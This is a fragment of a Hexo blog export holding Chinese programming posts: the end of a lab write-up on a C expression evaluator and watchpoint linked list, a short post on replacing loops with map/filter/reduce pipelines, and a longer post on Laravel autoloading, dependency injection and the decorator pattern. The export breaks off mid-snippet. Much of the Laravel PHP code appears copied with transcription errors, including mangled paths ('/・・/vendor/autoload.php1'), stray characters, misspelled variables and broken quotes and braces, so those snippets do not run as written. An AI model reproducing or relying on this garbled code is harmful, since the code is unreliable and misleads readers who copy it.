<span class="keyword">if</span>(tokens[i].type == LB) ++cnt;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == RB) --cnt;</span><br><span class="line">		<span class="keyword">if</span>(cnt != <span class="number">0</span>) <span class="keyword">continue</span>;	<span class="comment">//In mathched parentheses, pass</span></span><br><span class="line">		<span class="keyword">if</span>(PLUS &lt;= tokens[i].type &amp;&amp; tokens[i].type &lt;= POINTER) &#123;</span><br><span class="line">			<span class="keyword">if</span>(type &gt;= PRE[tokens[i].type]) type = PRE[tokens[i].type], now = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	assert(now != <span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">uint32_t</span> a, b;</span><br><span class="line">	<span class="comment">//solve &#x27;!&#x27;</span></span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type &gt;= NOT) &#123;</span><br><span class="line">		<span class="comment">//if type&gt;=not, which means other token has been solved</span></span><br><span class="line">		<span class="comment">//so the first token must be NOT or NEG or POINTER</span></span><br><span class="line">		b = eval(l + <span class="number">1</span>, r, success);</span><br><span class="line">		<span class="keyword">if</span>(!(*success)) <span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == NOT) <span class="keyword">return</span> !b;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == NEG) <span class="keyword">return</span> -b;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == POINTER) <span class="keyword">return</span> swaddr_read(b, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	a = eval(l, now - <span class="number">1</span>, success);</span><br><span class="line">	<span class="keyword">if</span>(!(*success))<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	b = eval(now + <span class="number">1</span>, r ,success);</span><br><span class="line">	<span class="keyword">if</span>(!(*success))<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == PLUS) <span class="keyword">return</span> a + b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == STAR) <span class="keyword">return</span> a * b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == DIV) <span class="keyword">return</span> a / b;	</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == MINUS) <span class="keyword">return</span> a - b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == EQ) <span class="keyword">return</span> a == b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == NOTEQ) <span class="keyword">return</span> a != b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == AND) <span class="keyword">return</span> a &amp;&amp; b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == OR) <span class="keyword">return</span> a || b;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">expr</span><span class="params">(<span class="keyword">char</span> *e, <span class="keyword">bool</span> *success)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!make_token(e)) &#123;</span><br><span class="line">		*success = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Insert codes to evaluate the expression. */</span></span><br><span class="line">	<span class="comment">//panic(&quot;please implement me&quot;);</span></span><br><span class="line">	<span class="comment">//Calculate the value</span></span><br><span class="line">	<span class="keyword">return</span> eval(<span class="number">0</span>, nr_token - <span class="number">1</span>, success);<span class="comment">//call eval to calculate the value of expression e</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="监视点"><a class="markdownIt-Anchor" href="#监视点"></a> 监视点</h4>
<p>本题较简单，即用一个链表结构维护一个监视点池。即需要实现几个函数，初始化监视点池、新申请一个监视点，释放一个监视点，向监视点插入表达式等方法。</p>
<p>初始化监视点池即将监视点头结点设为空，空闲节点设为整个监视点池</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_wp_pool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NR_WP; i ++) &#123;</span><br><span class="line">		wp_pool[i].NO = i;</span><br><span class="line">		wp_pool[i].next = &amp;wp_pool[i + <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	wp_pool[NR_WP - <span class="number">1</span>].next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	free_ = wp_pool;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新申请一个监视点需要将head节点指向空闲节点，再将空闲节点指向其next节点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">WP* <span class="title">new_wp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	assert(free_ != <span class="literal">NULL</span>);</span><br><span class="line">	WP* ans = free_;</span><br><span class="line">	free_ = ans-&gt;next;</span><br><span class="line">	ans-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移除节点则需要将这个节点从链表中移除出去。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(head == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;NO == id)&#123;</span><br><span class="line">		WP* tmp = head;</span><br><span class="line">		head = head-&gt;next;</span><br><span class="line">		wp_free(tmp);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	WP* now = head;</span><br><span class="line">	<span class="keyword">while</span>(now-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(now-&gt;next-&gt;NO == id) &#123;</span><br><span class="line">			WP* tmp = now-&gt;next;</span><br><span class="line">			now-&gt;next = now-&gt;next-&gt;next;</span><br><span class="line">			wp_free(tmp);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		now = now-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在ui.c的函数中只需要读入参数，调用这些维护监视点池的函数即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>使用管道代替循环</title>
    <url>/2020/07/07/instead-of-iterate-by-pipeline/</url>
    <content><![CDATA[<p>在《重构》这本书里提到了一个改善程序的方法，“以管道取代循环（Replace Loop with Pipeline）”。</p>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> names=[];</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">const</span> i <span class="keyword">of</span> input</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i.job===<span class="string">&quot;programmer&quot;</span>)</span><br><span class="line">		names.push(i.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> names=input.filter(<span class="function"><span class="params">i</span> =&gt;</span> i.job===<span class="string">&quot;programmer&quot;</span>).map(<span class="function"><span class="params">i</span>=&gt;</span>i.name);</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> nums=[<span class="number">10</span>,<span class="number">20</span>,<span class="number">111</span>,<span class="number">222</span>,<span class="number">444</span>,<span class="number">40</span>,<span class="number">50</span>];</span><br><span class="line"><span class="keyword">let</span> total=nums.filter(<span class="function"><span class="params">n</span>=&gt;</span>n&lt;<span class="number">100</span>).map(<span class="function"><span class="params">n</span>=&gt;</span>n*<span class="number">2</span>).reduce(<span class="function">(<span class="params">pre,n</span>)=&gt;</span>pre+n);</span><br><span class="line"><span class="built_in">console</span>.log(total);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="number">240</span></span><br></pre></td></tr></table></figure>
<p>集合管道（collection pipeline）允许使用一组运算来描述集合的迭代过程，其中每种运算接受的入参和返回值都是一个集合。这类运算有很多，map是指用一个函数作用于输入集合的每一个元素，将集合变换成另一个集合；filter运算时指用用一个函数从输入集合筛选出符合条件元素子集的过程。运算得到的集合可以供管道的后续流程使用；而reduce运算是通过输入做一个数组，最后经过进行汇总运算最后输出一个值。</p>
<p>在许多不同的语言中也有函数式编程的方法。</p>
<p>例如在php中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nums=<span class="keyword">$this</span>-&gt;nums;</span><br><span class="line">        $result=array_reduce(array_map(<span class="function"><span class="keyword">function</span> (<span class="params">$num</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $num*$num;</span><br><span class="line">        &#125;,array_filter($nums,<span class="function"><span class="keyword">function</span> (<span class="params">$num</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $num &gt;= <span class="number">5</span>;</span><br><span class="line">        &#125;)),<span class="function"><span class="keyword">function</span> (<span class="params">$preValue,$num</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $preValue+$num;</span><br><span class="line">        &#125;,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">echo</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $test=<span class="keyword">new</span> Test();</span><br><span class="line">    $test-&gt;count();</span><br><span class="line">&#125;</span><br><span class="line">main();</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">110</span>    </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>函数式编程</tag>
        <tag>重构</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Laravel</title>
    <url>/2020/06/28/deep-understanding-of-laravel/</url>
    <content><![CDATA[<p><img src="/2020/06/28/deep-understanding-of-laravel/deep-understanding-of-laravel%5Claravel.png" alt></p>
<a id="more"></a>
<h2 id="组件化开发与composer"><a class="markdownIt-Anchor" href="#组件化开发与composer"></a> 组件化开发与composer</h2>
<h3 id="composer"><a class="markdownIt-Anchor" href="#composer"></a> composer</h3>
<h4 id="组件安装"><a class="markdownIt-Anchor" href="#组件安装"></a> 组件安装</h4>
<h4 id="自动加载"><a class="markdownIt-Anchor" href="#自动加载"></a> 自动加载</h4>
<p>PSR-0和PSR-4标准</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;autoload&quot;</span>:&#123;</span><br><span class="line">		<span class="attr">&quot;psr-4&quot;</span>:&#123;<span class="attr">&quot;APP\\&quot;</span>:<span class="string">&quot;app/&quot;</span></span><br><span class="line">				 <span class="string">&quot;BPP\\&quot;</span>:<span class="string">&quot;bpp/&quot;</span></span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h4>
<p><strong>include和require关键字</strong></p>
<p>include和require关键字用于包含并运行指定文件。两者作用几乎一样，只是处理失败的方式不同，require在出错时会导致脚本程序运行终止，而include只是发出警告，而脚本程序会继续运行。</p>
<h4 id="类的自动加载"><a class="markdownIt-Anchor" href="#类的自动加载"></a> 类的自动加载</h4>
<p>类的自动加载可以通过魔术方法__autoload(string $class)实现，也可以通过函数spl_autoload_register注册一个自动加载方法，相应实例如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">require_once</span>($class.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当使用一个类名时，如果该类没有被当前文件包含，则会自动调用————autoload魔术方法。但在实际应用中，通常使用spl_autoload_register注册自动以德函数作为自动加载类的实现，因为__autoload()魔法函数只可以定义一次，而spl_autoload_register可以将多个类自动加载方法注册到队列。</p>
<p>在Laravel框架中，通过函数spl_autoload_register()实现类自动加载函数的注册，其中 类的自动加载函数队列中包含了两个类的自动加载函数，一个是composer生成的基于PSR 规范的自动加载函数，另一个是Laravel框架核心别名的自动加载函数。下面将给出Laravel 框架中的部分代码，进而介绍该框架下类的自动加载过程。这里Laravel框架所在根目录为 “laravel”，其中composer生成的自动加载函数注册过程如下：</p>
<p>文件：laravel\public\index.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require __DIR__.*&#x2F;..&#x2F;bootstrap&#x2F;autoload.php;</span><br><span class="line">	laravel\bootstrap\autoload.php</span><br></pre></td></tr></table></figure>
<p>文件： laravel\bootstrap\autoload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define (<span class="string">&#x27; LARAVEL_START&#x27;</span>, microtime (<span class="literal">true</span>));</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/・・/vendor/autoload.php1;</span></span><br></pre></td></tr></table></figure>
<p>在Laravel框架中，public\index.php文件为请求的入口文件，其中第一句便是包含启 动文件夹下的自动加载的文件，而该文件继续包含vendor目录下的自动加载文件，其中 vendor目录是composer生成的依赖包目录，而内部的自动加载文件也是composer生成的， 用于自动加载依赖包中的所有文件。下面简单介绍composer生成的类自动加载函数是如何 实现的。</p>
<p>文件：laravel\vendor\autoload.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">require_once __DIR__ . &#39;&#x2F;composer&#39; . &#39;&#x2F;autoload_real.php&#39;;</span><br><span class="line">return ComposerAutoloaderInit99123d508294c719fdcf537b9ee84731 ::getLoader();</span><br></pre></td></tr></table></figure>
<p>文件:laralvel\vendor\composer\ autoload_real.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComposerAutoloaderInit99123d508294c719fdcf537b9ee84731</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="built_in">static</span> $loader;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadClassLoader</span>(<span class="params">$class</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (*Composer\Autoload\ClassLoader === $class) </span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">require</span> <span class="keyword">__DIR__</span> .<span class="string">&#x27;/ClassLoader.php&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLoader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="built_in">self</span>::$loader) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="built_in">self</span>::$loader;</span><br><span class="line">                &#125;</span><br><span class="line">				spl_autoload_register(<span class="keyword">array</span>(<span class="string">&#x27;ComposerAutoloaderInit99123d508294c719fdcf53</span></span><br><span class="line"><span class="string">7b9ee84731&#x27;</span>z <span class="string">&#x27;loadClassLoaderr), true, true);</span></span><br><span class="line"><span class="string">		self::$loader = $loader = new \Composer\Autoload\ClassLoader();</span></span><br><span class="line"><span class="string">		spl_autoload_unregister(array(&#x27;</span>ComposerAutoloaderInit99123d508294c719fdef</span><br><span class="line"><span class="number">537</span>b9ee84731<span class="string">&#x27;, &#x27;</span>loadClassLoader1));</span><br><span class="line">			$map = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . */autoload_namespaces.phpr;</span><br><span class="line">		<span class="keyword">foreach</span> ($map <span class="keyword">as</span> $namespace =&gt; $path) &#123;</span><br><span class="line">				$loader-&gt;set($namespacer $path);</span><br><span class="line">			&#125;</span><br><span class="line">			$map = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/autoload_psr4.php&#x27;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($map <span class="keyword">as</span> $namespace =&gt; $path) &#123;</span><br><span class="line">				$loader-&gt;setPsr4($namespacer $path);</span><br><span class="line">			&#125;</span><br><span class="line">		$classMap = <span class="keyword">require</span> <span class="keyword">__DIR__</span> ・•/autoload_classmap.php1;</span><br><span class="line">		<span class="keyword">if</span> ($classMap) &#123;</span><br><span class="line">				$loader-&gt;addClassMap($classMap);</span><br><span class="line">			&#125;</span><br><span class="line">		$loader-&gt;register(<span class="literal">true</span>) ;	<span class="comment">//注册类自动加载函数</span></span><br><span class="line">		$includeFiles = <span class="keyword">require</span> <span class="keyword">__DIR__</span> .<span class="string">&#x27;/autoload_files.php&#x27;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($includeFiles <span class="keyword">as</span> $file) &#123;</span><br><span class="line">				composerRequire99123d508294c719fdcf537b9ee84731($file);</span><br><span class="line">				&#125;</span><br><span class="line">		<span class="keyword">return</span> $loader;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">composerRequire99123d508294c719fdcf537b9ee84731</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">require</span> $file;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>（后面太多了不想拷贝了）</p>
<h2 id="laravel框架中的设计模式"><a class="markdownIt-Anchor" href="#laravel框架中的设计模式"></a> Laravel框架中的设计模式</h2>
<h3 id="服务容器"><a class="markdownIt-Anchor" href="#服务容器"></a> 服务容器</h3>
<h4 id="依赖和耦合"><a class="markdownIt-Anchor" href="#依赖和耦合"></a> 依赖和耦合</h4>
<h4 id="工厂模式"><a class="markdownIt-Anchor" href="#工厂模式"></a> 工厂模式</h4>
<h4 id="ioc模式"><a class="markdownIt-Anchor" href="#ioc模式"></a> IOC模式</h4>
<p>IoC (Inversion of Control)模式又称依赖注入 (Depe-ndency Injection )模式。控制反转是将组件间的依赖关系从程序内部提到外部容器 来管理，而依赖注入是指组件的依赖通过外部以参数或其他形式注入，两种说法其实本质上 是一个意思。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Traverller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $trafficTool;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Visit $trafficTool</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trafficTool=$trafficTool;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vistTibet</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trafficTool-&gt;go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成以来的交通工具实例</span></span><br><span class="line"></span><br><span class="line">$trafficTool = <span class="keyword">new</span> Leg();</span><br><span class="line"><span class="comment">//依赖注入的方式解决依赖问题</span></span><br><span class="line"></span><br><span class="line">$tra=<span class="keyword">new</span> Traveller($trafficTool);</span><br><span class="line">$tra-&gt;visitTibet();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="请求处理管道"><a class="markdownIt-Anchor" href="#请求处理管道"></a> 请求处理管道</h3>
<p>上面已经解决了 Laravel框架中一个关键技术，就是利用服务容器和服务提供者解决依 赖注入及资源获取的功能，有了它就可以随时获取需要的服务，实现想要的功能。但对于服 务器来说，真正要实现的功能是处理输入的请求，并将生成的响应输出给客户端，而在处 理请求的过程中需要经历很多处理步骤，这些步骤需要做到松耦合，可以随时在这些步骤 中间添加新的处理功能而使改动尽可能小，通过源码的注解，设计者将其比喻成“洋葱”， 像它一样分很多层，每一层具有一定的功能，可以随时添加或修改这些层，而官方文档中将 这些层称为中间件，通过这些中间件使得程序的可扩展性大大增强。这里，其实使用的是一 种装饰者模式，只是PHP特有的编程方式使得其形式发生变化，下面我们就逐步揭开它的 面纱。</p>
<h4 id="装饰者模式"><a class="markdownIt-Anchor" href="#装饰者模式"></a> 装饰者模式</h4>
<p>装饰者模式是在开放一关闭原则下实现动态添加或减少功能的一种方式。以Laravel框 架为例，在解析请求生成响应之前或之后需要经过中间件的处理，主要包括验证维护模式、 Cookie加密、开启会话、CSRF保护等，而这些处理有些是在生成响应之前，有些是在生成 响应之后，在实际开发过程中有可能还需要添加新的处理功能，如果在不修改原有类的基础 上动态地添加或减少处理功能将使框架可扩展性大大增强，而这种需求正好可以被装饰者模 式解决。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaoFang</span> <span class="keyword">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $name;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>. <span class="keyword">$this</span>-&gt;name .<span class="string">&quot;我出门了！ ！ ！ &quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Finery</span> <span class="keyword">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $component;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Decorator $component</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;component = $component;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;component-&gt;display();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shoes</span> <span class="keyword">extends</span> <span class="title">Finery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;穿上鞋子&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="built_in">parent</span>::display();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Skirt</span> <span class="keyword">extends</span> <span class="title">Finery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> ”穿上裙子 n. r&lt;br&gt;*;</span><br><span class="line">		<span class="built_in">parent</span>::display();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fire</span> <span class="keyword">extends</span> <span class="title">Finery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;出门前先整理头发&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">		<span class="built_in">parent</span>::display();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;出门后再整理一下头发&#x27;</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$xiaofang = <span class="keyword">new</span> XiaoFang (<span class="number">1</span> 小芳 <span class="number">1</span>);</span><br><span class="line">$shoes = <span class="keyword">new</span> Shoes($xiaofang);</span><br><span class="line">$skirt = <span class="keyword">new</span> Skirt($shoes);</span><br><span class="line">$fire = <span class="keyword">new</span> Fire ($skirt);</span><br><span class="line">$fire-&gt;display ();</span><br><span class="line">输出：</span><br><span class="line">岀门前先整理头发</span><br><span class="line">穿上裙子</span><br><span class="line">穿上鞋子</span><br><span class="line">我是小芳，我出门了</span><br><span class="line">出门后再整理一下头发</span><br></pre></td></tr></table></figure>
<p>我们假设小芳接到一个电话算是请求，而小芳出门是对请求的响应，那么在小芳出门 前后要对自己进行打扮，对应于Laravel框架中，这些打扮的步骤就相当于中间件的功能， 而小芳出门是对请求的真正响应。在小芳打扮的过程中，可以随时增加新的打扮类，只要该 类继承Finery类（装饰类）并调用父类的同名方法，就可以在实现时重新组织打扮过程，实 现打扮步骤的增加或减少，例如加一件衣服、化个妆等。这就是装饰者模式的应用场景。</p>
<p>上面的输岀内容是Laravel框架对请求处理的部分流程，这里面大部分与上一节中装饰 者模式形式相似，但通过回调函数生成整个处理流程的过程还是比较难以理解。这里给一个 简单的实例用于理解，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Step</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"><span class="built_in">Closure</span> $next</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FirstStep</span> <span class="keyword">implements</span> <span class="title">Step</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"><span class="built_in">Closure</span> $next</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;开启 session,获取数据&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">		$next ();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;保存数据,关闭 session&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goFun</span>(<span class="params">$step, $className</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span>(<span class="params">$stepx $className</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $className::go($step);</span><br><span class="line">    &#125;;</span><br><span 